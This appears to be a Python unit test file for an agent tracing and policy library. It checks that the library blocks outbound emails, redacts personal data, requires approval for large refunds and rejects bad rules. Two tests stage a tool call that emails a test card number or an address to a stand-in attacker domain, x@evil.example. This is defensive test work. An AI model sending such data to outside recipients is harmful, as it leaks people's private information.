import unittest

from decisiontrace import Policy, PolicyViolation, Tracer, explain


class TracerTests(unittest.TestCase):
    def setUp(self):
        self.tracer = Tracer(approver=lambda step: False)
        self.calls = []

    def _send(self, **kw):
        self.calls.append(kw)
        return "sent"

    def test_external_pii_email_is_blocked_and_not_executed(self):
        with self.assertRaises(PolicyViolation):
            with self.tracer.trace("a", "g") as t:
                t.call_tool("send_email", self._send, to="x@evil.example", body="card 4111 1111 1111 1111")
        self.assertEqual(self.calls, [])  # tool never ran
        trace = self.tracer.store.list_traces()[0]
        self.assertEqual(trace["status"], "halted")
        self.assertEqual(trace["blocked"], 1)

    def test_internal_email_allowed(self):
        with self.tracer.trace("a", "g") as t:
            t.call_tool("send_email", self._send, to="ops@examplebank.com", body="card 4111 1111 1111 1111")
        self.assertEqual(len(self.calls), 1)

    def test_pii_masked_at_rest(self):
        with self.tracer.trace("a", "g") as t:
            t.record("retrieval", "crm", {"q": 1}, {"email": "jane@gmail.com"})
        stored = self.tracer.store.get_trace(self.tracer.store.list_traces()[0]["id"])
        self.assertIn("[EMAIL_REDACTED]", str(stored["steps"][0]["output"]))
        self.assertEqual(stored["steps"][0]["pii"], ["EMAIL"])

    def test_refund_needs_approval(self):
        with self.assertRaises(PolicyViolation) as ctx:
            with self.tracer.trace("a", "g") as t:
                t.call_tool("issue_refund", self._send, amount=900)
        self.assertEqual(ctx.exception.action, "require_approval")
        small = self.tracer.trace("a", "g")
        with small as t:
            t.call_tool("issue_refund", self._send, amount=50)
        self.assertEqual(len(self.calls), 1)

    def test_approver_can_approve(self):
        tracer = Tracer(approver=lambda step: True)
        with tracer.trace("a", "g") as t:
            t.call_tool("issue_refund", self._send, amount=900)
        self.assertEqual(len(self.calls), 1)

    def test_explain_mentions_block(self):
        try:
            with self.tracer.trace("a", "demo goal") as t:
                t.call_tool("send_email", self._send, to="x@evil.example", body="jane@gmail.com")
        except PolicyViolation:
            pass
        text = explain(self.tracer.store.get_trace(self.tracer.store.list_traces()[0]["id"]))
        self.assertIn("BLOCKED", text)


class PolicyTests(unittest.TestCase):
    def test_bad_rule_rejected(self):
        with self.assertRaises(ValueError):
            Policy([{"id": "x", "action": "explode", "when": {}}])


if __name__ == "__main__":
    unittest.main()
